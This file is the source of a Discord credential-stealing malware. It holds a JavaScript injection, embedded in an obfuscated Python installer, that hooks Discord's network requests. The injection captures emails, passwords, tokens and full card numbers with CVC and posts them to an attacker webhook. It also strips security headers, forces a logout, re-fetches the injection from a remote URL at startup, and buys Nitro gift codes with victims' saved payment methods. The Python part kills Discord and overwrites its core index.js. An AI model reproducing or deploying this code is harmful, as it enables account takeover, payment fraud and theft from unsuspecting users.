    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def JKDOWBOKGFDIJQUFSCUAAEMBMTVYPWJVRDBBDZOZUPDRTCCIWOH():
    import os
    import re
    import subprocess
    import psutil

    PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN = "Active"

    def PNDZRJKQDRVBCHQXYMETFTNYRJIUOONQAKPDKZMEZKZXECDBPBLYZCC(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC):
        for v4r_file in os.listdir(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC):
            if re.search(r'app-+?', v4r_file):
                LMMLWRCTOFIJHUMJDSDJRYUWHNNPFQVCROQQYRFLARMGIGNDHZEREQBAYXQKWYQNQWBIUYERJWMZMLAAIMIMIKQ = SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC + '\\' + v4r_file + '\\modules'
                if not os.path.exists(LMMLWRCTOFIJHUMJDSDJRYUWHNNPFQVCROQQYRFLARMGIGNDHZEREQBAYXQKWYQNQWBIUYERJWMZMLAAIMIMIKQ):
                    continue
                for v4r_file in os.listdir(LMMLWRCTOFIJHUMJDSDJRYUWHNNPFQVCROQQYRFLARMGIGNDHZEREQBAYXQKWYQNQWBIUYERJWMZMLAAIMIMIKQ):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA = LMMLWRCTOFIJHUMJDSDJRYUWHNNPFQVCROQQYRFLARMGIGNDHZEREQBAYXQKWYQNQWBIUYERJWMZMLAAIMIMIKQ + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA, v4r_file
        return None

    def MCDHJLCDTNMJOCDGTCFKCOYJMDMWDXOCZJAEOIBXTETEZAWSPTYDLORPKIIAEAQFXPCDYXGZAOBAEMKJIY(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC):
        SYINKCSLMBHMVDGWVZPPOJDQHQEWYSUHADCMYRXPUXPMHHBZQBG = SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC + '\\Update.exe'
        VBJRTEDZPAAHPMLLPYCFCXPJNOFEWAEUGASACPPMZSESAHOORSDZAACAWGMYXZHBGBDZTEOTOFYZFQCYSFSWZC = SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC):
            if re.search(r'app-+?', v4r_file):
                BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSO = SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC + '\\' + v4r_file
                if os.path.exists(BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSO + '\\' + 'modules'):
                    for v4r_file in os.listdir(BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSO):
                        if v4r_file == VBJRTEDZPAAHPMLLPYCFCXPJNOFEWAEUGASACPPMZSESAHOORSDZAACAWGMYXZHBGBDZTEOTOFYZFQCYSFSWZC:
                            VBJRTEDZPAAHPMLLPYCFCXPJNOFEWAEUGASACPPMZSESAHOORSDZAACAWGMYXZHBGBDZTEOTOFYZFQCYSFSWZC = BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSO + '\\' + VBJRTEDZPAAHPMLLPYCFCXPJNOFEWAEUGASACPPMZSESAHOORSDZAACAWGMYXZHBGBDZTEOTOFYZFQCYSFSWZC
                            subprocess.call([SYINKCSLMBHMVDGWVZPPOJDQHQEWYSUHADCMYRXPUXPMHHBZQBG, '--processStart', VBJRTEDZPAAHPMLLPYCFCXPJNOFEWAEUGASACPPMZSESAHOORSDZAACAWGMYXZHBGBDZTEOTOFYZFQCYSFSWZC],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def CWPRPCLZLZUZILCFYODXSBWDQQVHWLWLGWEVZNZHZUVUHKHNNHPFRZZCNXOHSQRY():
        BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSOdata = os.getenv('LOCALAPPDATA')
        NNPFYUQWQCCLOGLGGJEDIWBRKGNUBTMNBNGMIYJHIPULLGKLRP = [
            BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSOdata + '\\Discord',
            BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSOdata + '\\DiscordCanary',
            BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSOdata + '\\DiscordPTB',
            BMBDGTMIUEIQOURSTSDGCMWTIUMWRNOOOMYJUWYJTPRWSYRZQCUFMDMYIAWQGSOdata + '\\DiscordDevelopment'
        ]
        ICJZGUSUFCEMOXQMDDJSQPLPNVJKCWWBPFEHOSQWMKYLDKTYMWWGJY = KDNGGZWVUFNRKUSVMMZNQCBBAXTKXTUBQQKZOPCFNHYRYVPQAEFPEKKQCDSRQYYCKNCZWMGS

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC in NNPFYUQWQCCLOGLGGJEDIWBRKGNUBTMNBNGMIYJHIPULLGKLRP:
            if not os.path.exists(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC):
                continue

            ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA_info = PNDZRJKQDRVBCHQXYMETFTNYRJIUOONQAKPDKZMEZKZXECDBPBLYZCC(SHIBGBFVOUHQFJNFBGQDTSYMKUVLBZVIYLYQQUNAXCELWGISCZJNXQTYYJZPHRKYMYOYVEAPOZRMTZYPJQOHXLJIEC)
            if ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA_info is not None:
                ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA, ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA_file = ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA_info
                
                NKQSYMNQEOMLHOFSSCIKQXMYZXLSXHVEJPKPRBWCDFYAKMTRQHCBIFSPISELSUYTNIAYQPCDUUR = ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA + '\\index.js'
                
                if not os.path.exists(NKQSYMNQEOMLHOFSSCIKQXMYZXLSXHVEJPKPRBWCDFYAKMTRQHCBIFSPISELSUYTNIAYQPCDUUR):
                    open(NKQSYMNQEOMLHOFSSCIKQXMYZXLSXHVEJPKPRBWCDFYAKMTRQHCBIFSPISELSUYTNIAYQPCDUUR, 'w').close()

                with open(NKQSYMNQEOMLHOFSSCIKQXMYZXLSXHVEJPKPRBWCDFYAKMTRQHCBIFSPISELSUYTNIAYQPCDUUR, 'w', encoding='utf-8') as f:
                    f.write((ICJZGUSUFCEMOXQMDDJSQPLPNVJKCWWBPFEHOSQWMKYLDKTYMWWGJY).replace('discord_desktop_core-1', ENOGVRHQENXVNJZWYLSCLNELGHXJBURTYCHBCGICDHDJUPIZDJIDIRFGKCYVQBBDWPDYA_file)
                            .replace(r"%WEBHOOK_HERE%", BSSWBVSVFPQLDWZMFKXDPUIAIHSKDNIXDKPGMIZFWUWDDIPWHANKVTYBFGFVYNRMWNCAR)
                            .replace(r"%EMBED_COLOR%", str(TERSYZNSHSJYJYKIBWVSNEGOUYNOLMLHQMXINJLJLWUDKATBGYKKULLSGJZBIIWMSXDT))
                            .replace(r"%USERNAME%", JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ)
